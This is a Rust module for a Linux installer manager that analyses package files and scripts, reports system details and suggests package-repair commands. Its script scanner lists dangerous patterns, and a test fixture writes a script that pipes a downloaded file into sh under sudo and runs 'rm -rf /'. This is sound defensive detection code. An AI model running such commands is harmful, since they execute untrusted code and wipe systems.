use crate::detector::{DetectionResult, InstallerType};
use crate::receipts::Receipt;
use serde::Serialize;
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

#[derive(Debug, Clone, Serialize)]
pub struct PackageAnalysis {
    pub path: String,
    pub name: String,
    pub version: String,
    pub architecture: String,
    pub publisher: String,
    pub size_bytes: u64,
    pub installed_size: String,
    pub files: Vec<String>,
    pub file_count: usize,
    pub risk_level: String,
    pub risk_codes: Vec<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct RepairAction {
    pub id: String,
    pub title: String,
    pub description: String,
    pub command: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct SystemInfo {
    pub distribution: String,
    pub version: String,
    pub desktop: String,
    pub kernel: String,
    pub architecture: String,
    pub package_manager: String,
    pub disk_total: String,
    pub disk_used: String,
    pub disk_available: String,
    pub disk_percent: String,
    pub updates_available: Option<usize>,
    pub repair_actions: Vec<RepairAction>,
}

pub fn analyze_installer(path: &str) -> Result<PackageAnalysis, String> {
    let detection = DetectionResult::new(path)?;
    let metadata = fs::metadata(path).map_err(|e| e.to_string())?;
    let mut analysis = PackageAnalysis {
        path: path.to_string(),
        name: detection.filename.clone(),
        version: "-".to_string(),
        architecture: std::env::consts::ARCH.to_string(),
        publisher: "-".to_string(),
        size_bytes: metadata.len(),
        installed_size: "-".to_string(),
        files: Vec::new(),
        file_count: 0,
        risk_level: "low".to_string(),
        risk_codes: Vec::new(),
    };

    match detection.installer_type {
        InstallerType::Deb => analyze_deb(path, &mut analysis),
        InstallerType::Rpm => analyze_rpm(path, &mut analysis),
        InstallerType::ArchPkg => analyze_arch(path, &mut analysis),
        InstallerType::Script => analyze_script(path, &mut analysis),
        InstallerType::AppImage => {
            analysis.name = detection
                .filename
                .trim_end_matches(".AppImage")
                .trim_end_matches(".appimage")
                .to_string();
            analysis.risk_codes.push("unsigned_binary".to_string());
        }
        _ => {
            analysis.risk_codes.push("unverified_archive".to_string());
        }
    }

    analysis.file_count = analysis.files.len();
    if analysis.files.len() > 80 {
        analysis.files.truncate(80);
    }
    analysis.risk_level = risk_level(&analysis.risk_codes).to_string();
    Ok(analysis)
}

fn analyze_deb(path: &str, analysis: &mut PackageAnalysis) {
    analysis.name =
        capture("dpkg-deb", &["-f", path, "Package"]).unwrap_or_else(|| analysis.name.clone());
    analysis.version =
        capture("dpkg-deb", &["-f", path, "Version"]).unwrap_or_else(|| "-".to_string());
    analysis.architecture =
        capture("dpkg-deb", &["-f", path, "Architecture"]).unwrap_or_else(|| "-".to_string());
    analysis.publisher =
        capture("dpkg-deb", &["-f", path, "Maintainer"]).unwrap_or_else(|| "-".to_string());
    analysis.installed_size = capture("dpkg-deb", &["-f", path, "Installed-Size"])
        .map(|v| format!("{} KiB", v))
        .unwrap_or_else(|| "-".to_string());
    analysis.files = capture_lines("dpkg-deb", &["-c", path])
        .into_iter()
        .filter_map(|line| line.split_whitespace().last().map(str::to_string))
        .collect();
    analysis.risk_codes.push("root_install".to_string());
    if !analysis.publisher.contains('<') {
        analysis.risk_codes.push("unknown_publisher".to_string());
    }
}

fn analyze_rpm(path: &str, analysis: &mut PackageAnalysis) {
    analysis.name =
        capture("rpm", &["-qp", "--qf", "%{NAME}", path]).unwrap_or_else(|| analysis.name.clone());
    analysis.version = capture("rpm", &["-qp", "--qf", "%{VERSION}-%{RELEASE}", path])
        .unwrap_or_else(|| "-".to_string());
    analysis.architecture =
        capture("rpm", &["-qp", "--qf", "%{ARCH}", path]).unwrap_or_else(|| "-".to_string());
    analysis.publisher =
        capture("rpm", &["-qp", "--qf", "%{VENDOR}", path]).unwrap_or_else(|| "-".to_string());
    analysis.installed_size = capture("rpm", &["-qp", "--qf", "%{SIZE}", path])
        .and_then(|v| v.parse::<u64>().ok())
        .map(format_bytes)
        .unwrap_or_else(|| "-".to_string());
    analysis.files = capture_lines("rpm", &["-qpl", path]);
    analysis.risk_codes.push("root_install".to_string());
}

fn analyze_arch(path: &str, analysis: &mut PackageAnalysis) {
    if let Some(pkginfo) = capture("bsdtar", &["-xOf", path, ".PKGINFO"]) {
        let values = parse_key_values(&pkginfo);
        analysis.name = first_value(&values, "pkgname").unwrap_or_else(|| analysis.name.clone());
        analysis.version = first_value(&values, "pkgver").unwrap_or_else(|| "-".to_string());
        analysis.architecture = first_value(&values, "arch").unwrap_or_else(|| "-".to_string());
        analysis.publisher = first_value(&values, "packager").unwrap_or_else(|| "-".to_string());
        analysis.installed_size = first_value(&values, "size")
            .and_then(|v| v.parse::<u64>().ok())
            .map(format_bytes)
            .unwrap_or_else(|| "-".to_string());
    }
    analysis.files = capture_lines("bsdtar", &["-tf", path]);
    analysis.risk_codes.push("root_install".to_string());
}

fn analyze_script(path: &str, analysis: &mut PackageAnalysis) {
    let content = fs::read_to_string(path).unwrap_or_default();
    analysis.files = content.lines().take(80).map(str::to_string).collect();
    let lower = content.to_lowercase();
    let checks = [
        (
            "destructive_delete",
            ["rm -rf /", "rm -rf $home", "rm -rf ~"].as_slice(),
        ),
        ("downloads_code", ["curl ", "wget "].as_slice()),
        ("uses_root", ["sudo ", "pkexec "].as_slice()),
        (
            "writes_system",
            ["/etc/", "/usr/", "/bin/", "/sbin/"].as_slice(),
        ),
        (
            "unsafe_permissions",
            ["chmod 777", "chmod -r 777"].as_slice(),
        ),
        (
            "dynamic_execution",
            ["eval ", "bash -c", "sh -c"].as_slice(),
        ),
        (
            "disk_operation",
            ["mkfs", "dd if=", "fdisk", "parted "].as_slice(),
        ),
        (
            "service_change",
            ["systemctl enable", "systemctl disable"].as_slice(),
        ),
    ];
    for (code, patterns) in checks {
        if patterns.iter().any(|pattern| lower.contains(pattern)) {
            analysis.risk_codes.push(code.to_string());
        }
    }
}

pub fn system_info() -> Result<SystemInfo, String> {
    let os_release = fs::read_to_string("/etc/os-release").unwrap_or_default();
    let os = parse_key_values(&os_release);
    let distribution = first_value(&os, "PRETTY_NAME")
        .or_else(|| first_value(&os, "NAME"))
        .unwrap_or_else(|| "Linux".to_string())
        .trim_matches('"')
        .to_string();
    let version = first_value(&os, "VERSION_ID")
        .unwrap_or_else(|| "-".to_string())
        .trim_matches('"')
        .to_string();
    let package_manager = detect_package_manager();
    let disk = capture_lines("df", &["-h", "/"]);
    let disk_parts: Vec<&str> = disk
        .last()
        .map(|line| line.split_whitespace().collect())
        .unwrap_or_default();

    Ok(SystemInfo {
        distribution,
        version,
        desktop: std::env::var("XDG_CURRENT_DESKTOP").unwrap_or_else(|_| "-".to_string()),
        kernel: capture("uname", &["-r"]).unwrap_or_else(|| "-".to_string()),
        architecture: capture("uname", &["-m"])
            .unwrap_or_else(|| std::env::consts::ARCH.to_string()),
        package_manager: package_manager.clone(),
        disk_total: disk_parts.get(1).unwrap_or(&"-").to_string(),
        disk_used: disk_parts.get(2).unwrap_or(&"-").to_string(),
        disk_available: disk_parts.get(3).unwrap_or(&"-").to_string(),
        disk_percent: disk_parts.get(4).unwrap_or(&"-").to_string(),
        updates_available: update_count(&package_manager),
        repair_actions: repair_actions(&package_manager),
    })
}

pub fn launch_receipt(receipt: &Receipt) -> Result<(), String> {
    if receipt.installer_type == "AppImage" {
        let path = receipt
            .install_path
            .as_deref()
            .unwrap_or(&receipt.source_path);
        Command::new(path)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|e| format!("Application could not be opened: {}", e))?;
        return Ok(());
    }

    let desktop = find_desktop_entry(receipt)
        .ok_or_else(|| "Desktop entry could not be found".to_string())?;
    Command::new("gtk-launch")
        .arg(desktop)
        .spawn()
        .map_err(|e| format!("Application could not be opened: {}", e))?;
    Ok(())
}

pub fn show_receipt_location(receipt: &Receipt) -> Result<(), String> {
    let path = receipt
        .install_path
        .as_deref()
        .unwrap_or(&receipt.source_path);
    let target = Path::new(path).parent().unwrap_or_else(|| Path::new(path));
    Command::new("xdg-open")
        .arg(target)
        .spawn()
        .map_err(|e| format!("Location could not be opened: {}", e))?;
    Ok(())
}

fn find_desktop_entry(receipt: &Receipt) -> Option<String> {
    let home = std::env::var("HOME").unwrap_or_default();
    let dirs = [
        PathBuf::from("/usr/share/applications"),
        PathBuf::from(home).join(".local/share/applications"),
    ];
    let needles = [
        receipt.package_name.as_deref().unwrap_or(""),
        receipt.app_name.as_str(),
    ]
    .map(|value| value.to_lowercase().replace([' ', '_'], "-"));
    for dir in dirs {
        for entry in fs::read_dir(dir).ok()?.flatten() {
            let path = entry.path();
            if path.extension().and_then(|v| v.to_str()) != Some("desktop") {
                continue;
            }
            let stem = path.file_stem()?.to_string_lossy().to_string();
            let lower = stem.to_lowercase();
            if needles
                .iter()
                .any(|needle| !needle.is_empty() && lower.contains(needle))
            {
                return Some(stem);
            }
        }
    }
    None
}

fn detect_package_manager() -> String {
    for manager in ["apt", "dnf", "pacman", "zypper"] {
        if command_exists(manager) {
            return manager.to_string();
        }
    }
    "unknown".to_string()
}

fn update_count(manager: &str) -> Option<usize> {
    match manager {
        "apt" => Some(
            capture_lines("apt", &["list", "--upgradable"])
                .into_iter()
                .filter(|line| line.contains("upgradable from"))
                .count(),
        ),
        "dnf" => capture_with_status("dnf", &["check-update", "--quiet"]).map(|(_, output)| {
            output
                .lines()
                .filter(|line| !line.trim().is_empty())
                .count()
        }),
        "pacman" => Some(capture_lines("pacman", &["-Qu"]).len()),
        "zypper" => Some(
            capture_lines("zypper", &["list-updates"])
                .into_iter()
                .filter(|line| line.starts_with("v "))
                .count(),
        ),
        _ => None,
    }
}

fn repair_actions(manager: &str) -> Vec<RepairAction> {
    let mut actions = Vec::new();
    match manager {
        "apt" => {
            actions.push(action(
                "apt_fix",
                "Fix broken dependencies",
                "Completes interrupted package configuration and repairs dependencies.",
                "sudo dpkg --configure -a && sudo apt --fix-broken install",
            ));
            actions.push(action(
                "apt_clean",
                "Clean package cache",
                "Removes downloaded package cache and unused dependencies.",
                "sudo apt clean && sudo apt autoremove",
            ));
        }
        "dnf" => {
            actions.push(action(
                "dnf_check",
                "Check package database",
                "Checks the RPM database and synchronizes distribution packages.",
                "sudo rpm --verifydb && sudo dnf distro-sync",
            ));
            actions.push(action(
                "dnf_clean",
                "Clean package cache",
                "Cleans DNF metadata and package cache.",
                "sudo dnf clean all",
            ));
        }
        "pacman" => {
            actions.push(action(
                "pacman_check",
                "Check dependencies",
                "Checks installed packages for missing dependencies.",
                "sudo pacman -Dk",
            ));
            actions.push(action(
                "pacman_keys",
                "Refresh package keys",
                "Refreshes and updates the pacman keyring.",
                "sudo pacman-key --refresh-keys",
            ));
        }
        "zypper" => {
            actions.push(action(
                "zypper_verify",
                "Verify dependencies",
                "Verifies and repairs package dependencies.",
                "sudo zypper verify",
            ));
        }
        _ => {}
    }
    actions
}

fn action(id: &str, title: &str, description: &str, command: &str) -> RepairAction {
    RepairAction {
        id: id.to_string(),
        title: title.to_string(),
        description: description.to_string(),
        command: command.to_string(),
    }
}

fn risk_level(codes: &[String]) -> &'static str {
    if codes.iter().any(|code| {
        matches!(
            code.as_str(),
            "destructive_delete" | "disk_operation" | "dynamic_execution"
        )
    }) {
        "high"
    } else if codes.iter().any(|code| {
        matches!(
            code.as_str(),
            "downloads_code"
                | "uses_root"
                | "writes_system"
                | "unsafe_permissions"
                | "service_change"
                | "root_install"
                | "unsigned_binary"
                | "unverified_archive"
                | "unknown_publisher"
        )
    }) {
        "medium"
    } else {
        "low"
    }
}

fn parse_key_values(content: &str) -> HashMap<String, Vec<String>> {
    let mut values = HashMap::new();
    for line in content.lines() {
        if let Some((key, value)) = line.split_once('=') {
            values
                .entry(key.trim().to_string())
                .or_insert_with(Vec::new)
                .push(value.trim().to_string());
        }
    }
    values
}

fn first_value(values: &HashMap<String, Vec<String>>, key: &str) -> Option<String> {
    values.get(key).and_then(|items| items.first()).cloned()
}

fn capture(command: &str, args: &[&str]) -> Option<String> {
    let output = Command::new(command).args(args).output().ok()?;
    if !output.status.success() {
        return None;
    }
    let value = String::from_utf8_lossy(&output.stdout).trim().to_string();
    if value.is_empty() {
        None
    } else {
        Some(value)
    }
}

fn capture_lines(command: &str, args: &[&str]) -> Vec<String> {
    capture_with_status(command, args)
        .map(|(_, output)| output.lines().map(str::to_string).collect())
        .unwrap_or_default()
}

fn capture_with_status(command: &str, args: &[&str]) -> Option<(i32, String)> {
    let output = Command::new(command).args(args).output().ok()?;
    Some((
        output.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&output.stdout).to_string(),
    ))
}

fn command_exists(command: &str) -> bool {
    Command::new("sh")
        .arg("-c")
        .arg(format!("command -v {} >/dev/null 2>&1", command))
        .status()
        .map(|status| status.success())
        .unwrap_or(false)
}

fn format_bytes(bytes: u64) -> String {
    if bytes >= 1_073_741_824 {
        format!("{:.1} GiB", bytes as f64 / 1_073_741_824.0)
    } else if bytes >= 1_048_576 {
        format!("{:.1} MiB", bytes as f64 / 1_048_576.0)
    } else if bytes >= 1024 {
        format!("{:.1} KiB", bytes as f64 / 1024.0)
    } else {
        format!("{} B", bytes)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reads_current_system_information() {
        let info = system_info().expect("system information should be readable");
        assert!(!info.distribution.is_empty());
        assert!(!info.kernel.is_empty());
        assert!(!info.architecture.is_empty());
    }

    #[test]
    fn detects_high_risk_script_commands() {
        let path = std::env::temp_dir().join(format!(
            "linux-install-manager-risk-{}.sh",
            uuid::Uuid::new_v4()
        ));
        fs::write(
            &path,
            "#!/bin/sh\nsudo curl https://example.com/run.sh | sh\nrm -rf /\n",
        )
        .expect("test script should be written");

        let analysis =
            analyze_installer(path.to_str().unwrap()).expect("script should be analyzed");
        let _ = fs::remove_file(path);

        assert_eq!(analysis.risk_level, "high");
        assert!(analysis
            .risk_codes
            .contains(&"destructive_delete".to_string()));
        assert!(analysis.risk_codes.contains(&"downloads_code".to_string()));
        assert!(analysis.risk_codes.contains(&"uses_root".to_string()));
    }
}
